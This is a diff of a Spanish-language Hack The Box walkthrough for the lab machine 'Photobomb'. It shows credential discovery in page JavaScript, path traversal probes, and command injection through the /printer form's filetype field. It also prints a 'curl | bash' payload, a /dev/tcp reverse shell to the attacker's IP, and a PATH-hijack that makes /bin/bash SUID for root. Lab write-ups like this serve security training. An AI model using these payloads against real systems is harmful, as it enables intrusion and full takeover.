@@ -1,8 +1,10 @@
 # 10.10.11.182 - Photobomb
+![Photobomb](https://user-images.githubusercontent.com/96772264/218688313-450c9c20-ec71-405e-8e1f-04e45a5d9484.png)
+
 --------------------------
+# Part 1: Enumeración
 
 Puertos abiertos 22(ssh), 80(http):
-
 ```console
 └─$ whatweb photobomb.htb
 HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)]
@@ -14,92 +16,93 @@ HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)]
 000008546:   401        7 L      12 W       188 Ch      "printer_friendly"
 000013484:   401        7 L      12 W       188 Ch      "printer_icon"
 ```
-Si es busqueda de subdirectorios, archivos txt o lo que sea arroja los mismos resultados. Parece que hay algun 
-tipo de regla que todo lo que empize por "printer" lo inluye saliendo el mismo resultado
-En la busqueda de subdominios no conseguimos resultado.
+![photo1](https://user-images.githubusercontent.com/96772264/218689503-71ac1728-3b3e-4427-a7a2-b8ec3dc8d7f2.PNG)
 
-Si inspeccionaos el codigo fuente encontramos la ruta "photobomb.js".
+Si es busqueda de subdirectorios, archivos txt o lo que sea arroja los mismos resultados. 
+Como el servidor es nginx hay programado una regla para que todo lo que empize por "printer" lo inluye saliendo el mismo resultado.
+```location /printer { ```
+
+--------------------------
+# Part 2: Framework Sinatra
+
+En la busqueda de subdominios no conseguimos resultado. Si inspeccionaos el codigo fuente encontramos la ruta "photobomb.js".
+
 ```console
 function init() {
-  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
+  // Jameson: Pon las credenciales para los de soporte tecnico que se les olvida siempre y me mandan mails sin parar.
   if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
     document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');}}
 window.onload = init;
 ```
-Conseguimos el usuario "Jameson" y "http://pH0t0:b0Mb!@photobomb.htb/printer" (usuario pH0t0 contraseña b0Mb!)
+Conseguimos el usuario "Jameson" y "pH0t0:b0Mb!@photobomb.htb/printer" (usuario pH0t0 contraseña b0Mb!)
 Te sale un sitio con fotografias para descargar.
+
+![photo2](https://user-images.githubusercontent.com/96772264/218689534-5ea32537-9295-461a-bc4e-0203bda05418.PNG)
+
 ```
 /POST a photobomb.htb/printer
 Authorization: Basic cEgwdDA6YjBNYiE=  ->  ("pH0t0:b0Mb!" en base64)
 photo=masaaki-komori-NYFaNoiPf7A-unsplash.jpg&filetype=jpg&dimensions=3000x2000
 ```
-
 La ruta de las fotografias está bajo *photobomb.htb/ui_images*. Si buscamos esto sale un codigo extraño:
 ```
-Sinatra no se conoce esta cancioncilla
-Try this:
+Sinatra no se conoce esta cancioncilla. Intenta esto:
 [http://127.0.0.1:4567/__sinatra__/404.png]
-get '/ui_images'; do
-  "Hello World"
-end
+get '/ui_images'; do  "Hello World"  end
 ```
-Sinatra es un framework escrito en ruby que utiliza regex para las rutas, por eso todo lo que sea printer*
-sale con el mismo resultado.
+
 Tanto [en](https://security.snyk.io/vuln/SNYK-RUBY-SINATRA-22017) como [en](https://sinatrarb.com/protection/path_traversal) 
 encuentro que sinatra es vulnerable a path traversal urlencodeando los '/'(%2f) y los '.'(%2e)
 ```
-http://photobomb.htb/ui_images%2f..%2f..%2f..etc/passwd -> bad request
-http://photobomb.htb/ui_images/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd -> /etc/passwd
-http://photobomb.htb/ui_images/test -> /ui_images/test
-http://photobomb.htb/ui_images/../../../../etc/passwd -> /etc/passwd
-http://photobomb.htb/ui_images//....//....//....//etc/passwd -> /ui_images/..../..../..../etc/passwd 
-http://photobomb.htb/ui_images//..//..//..//etc/passwd -> /ui_images/etc/passwd
+photobomb.htb/ui_images%2f..%2f..%2f..etc/passwd -> bad request
+photobomb.htb/ui_images/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd -> /etc/passwd
+photobomb.htb/ui_images/test -> /ui_images/test
+photobomb.htb/ui_images/../../../../etc/passwd -> /etc/passwd
+photobomb.htb/ui_images//....//....//....//etc/passwd -> /ui_images/..../..../..../etc/passwd 
+photobomb.htb/ui_images//..//..//..//etc/passwd -> /ui_images/etc/passwd
 ```
+Despues de un bune rato haciendo pruebas no doy con ninguna vulnerabilidad. Parece que está bien sanitizado. 
 
-Parece que está bien sanitizado. La parte de la descarga de imágenes...
+--------------------------
+# Part 3: OS Command Inyection
 
+La parte de la descarga de imágenes...
 ```console
-└─$ curl -s -X POST http://photobomb.htb/printer -H 'Authorization: Basic cEgwdDA6YjBNYiE=' \                    2-d 'photo=masaaki-komori-NYFaNoiPf7A-unsplash.jpg&filetype=jpg&dimensions=3000x2000' -i
-# 200 ok
+└─$ curl -s -X POST http://photobomb.htb/printer -H 'Authorization: Basic cEgwdDA6YjBNYiE='  \
+- d 'photo=masaaki-komori-NYFaNoiPf7A-unsplash.jpg&filetype=jpg&dimensions=3000x2000' -i # -> 200 ok
+-d 'photo=../../../../etc/passwd&filetype=jpg&dimensions=3000x2000' # -> invalid photo
+-d 'photo=masaaki-komori-NYFaNoiPf7A-unsplash.jpg;ping -c 1 10.10.14.3&filetype=jpg&dimensions=3000x200' # -> Source photo does not exist.
+-d 'photo=masaaki-komori-NYFaNoiPf7A-unsplash.jpg&filetype=jpg&dimensions=3000x200;ping -c 1 10.10.14.3' # ->  Invalid dimensions.
+-d 'photo=masaaki-komori-NYFaNoiPf7A-unsplash.jpg&filetype=jpg;test&dimensions=3000x2000' # -> Failed to generate a copy of masaaki-komori-...jpg 
 
--d 'photo=../../../../etc/passwd&filetype=jpg&dimensions=3000x2000'
-# invalid photo
-
--d 'photo=masaaki-komori-NYFaNoiPf7A-unsplash.jpg;ping -c 1 10.10.14.3&filetype=jpg&dimensions=3000x200'
-# Source photo does not exist.
-
--d 'photo=masaaki-komori-NYFaNoiPf7A-unsplash.jpg&filetype=jpg&dimensions=3000x200;ping -c 1 10.10.14.3' 
-# Invalid dimensions.
-
--d 'photo=masaaki-komori-NYFaNoiPf7A-unsplash.jpg&filetype=jpg;test&dimensions=3000x2000'
-# Failed to generate a copy of masaaki-komori-NYFaNoiPf7A-unsplash.jpg 
-
-
--d 'photo=masaaki-komori-NYFaNoiPf7A-unsplash.jpg&filetype=jpg;ping -c 1 10.10.14.3&dimensions=3000x2000'
+-d 'photo=masaaki-komori-NYFaNoiPf7A-unsplash.jpg&filetype=jpg;ping -c 1 10.10.14.3&dimensions=3000x2000' 
 # sudo tcpdump icmp -n -i tun0  -> paquete recibido -> RCE
-
--d 'photo=masaaki-komori-NYFaNoiPf7A-unsplash.jpg&filetype=jpg;curl http://10.10.14.3 | bash&dimensions=3000x200'
 ```
+Al recibir una petición, me monto un servidor con python y creo un archivo index.html con este contenido
 ```bash
 #!/bin/sh
 bash -c 'bash -i >& /dev/tcp/10.10.14.3/666 0>&1'
 ```
-En el directorio por el que accedo encuentro:
+Mandando esto: ```-d 'photo=masaaki-komori-NYFaNoiPf7A-unsplash.jpg&filetype=jpg;curl http://10.10.14.3 | bash&dimensions=3000x200'```
+(al pipearlo con bash ejecuta el comando escrito en index.html gracias al seabang "#!/bin/sh")
 
+--------------------------
+# Part 4: Dentro del sistema -> Path hijacking
+
+En el directorio por el que accedo encuentro:
 ```console
 wizard@photobomb:~/photobomb$ cat photobomb.sh 
 #!/bin/sh
 cd $(dirname $(readlink -f "$0"))
-ruby server.rb >>log/photobomb.log 2>&1
+ruby server.rb >> log/photobomb.log 2>&1
 ```
-Como bien he leido bajo el puerto 4567 corre ruby
-```
+Subo mi [script](https://github.com/CUCUxii/Pentesting-tools/blob/main/lin_info_xii.sh) de reconocimiento: 
+Como bien he leido en la documentacion de Sinatra bajo el puerto 4567 corre ruby
+```console
+wizard@photobomb:~/photobomb$ netstat -tulvpn | grep "4567"
 tcp        0      0 127.0.0.1:4567          0.0.0.0:*               LISTEN      769/ruby
 ```
-
-En /opt existe el script cleanup.sh, cuyo propietario es root y que supongo que corre a intervalos de tiempo 
-regulares
-
+En /opt existe el script cleanup.sh, cuyo propietario es root y que supongo que corre a intervalos de tiempo regulares.
 ```bash
 #!/bin/bash
 cd /home/wizard/photobomb
@@ -114,27 +117,32 @@ fi
 # Asigna privilegios de root a todas las fotos
 find source_images -type f -name '*.jpg' -exec chown root:root {} \;
 ```
-Si subimos el procmon.sh al rato detecta el proceso:
-Como el find se hace por ruta relativa se puede hacer un secuestro de PATH
-
+Si subimos el [procmon.sh](https://github.com/CUCUxii/Pentesting-tools/blob/main/procmon.sh) al rato detecta el proceso:
 ```
 > /bin/sh -c sudo /opt/cleanup.sh
 > sudo /opt/cleanup.sh
 > /bin/bash /opt/cleanup.sh
 > find source_images -type f -name *.jpg -exec chown root:root {} ;
 ```
-
+Como el "find" se hace por ruta relativa se puede hacer un secuestro de PATH
 ```console
-wizard@photobomb:~/photobomb$ echo '#!/bin/sh' > /tmp/find 
+# 1. Creamos un find malicioso que nos haga SUID a la bash.
+wizard@photobomb:~/photobomb$ echo '#!/bin/sh' > /tmp/find     
 wizard@photobomb:~/photobomb$ echo 'chmod u+s /bin/bash' >> /tmp/find
 wizard@photobomb:~/photobomb$ chmod +x /tmp/find
+
+# 2. Cambia el PATH para que al buscar "find" encuentre primero el malicioso
 wizard@photobomb:/tmp$ sudo PATH=/tmp:$PATH /opt/cleanup.sh
+
 wizard@photobomb:/tmp$ ls -l /bin/bash
 -rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
 wizard@photobomb:/tmp$ bash -p
 bash-5.0# whoami
 root
 ```
+
+--------------------------
+# Extra: Codigo fuente del servidor (Sinatra -> server.rb)
 
 ```
 # server.rb
@@ -240,15 +248,12 @@ post '/printer' do
   if !FileTest.exist?( "source_images/" + photo ) halt 500, 'Source photo does not exist.' end
   if !filetype.match(/^(png|jpg)/) halt 500, 'Invalid filetype.' end
   if !dimensions.match(/^[0-9]+x[0-9]+$/) halt 500, 'Invalid dimensions.' end
-
   case filetype
 	 when 'png'  content_type 'image/png'
  	 when 'jpg'  content_type 'image/jpeg'
   end
-
   filename = photo.sub('.jpg', '') + '_' + dimensions + '.' + filetype
   response['Content-Disposition'] = "attachment; filename=#{filename}"
-
   if !File.exists?('resized_images/' + filename)
     command = 'convert source_images/' + photo + ' -resize ' + dimensions + ' resized_images/' + filename
     puts "Executing: #{command}"
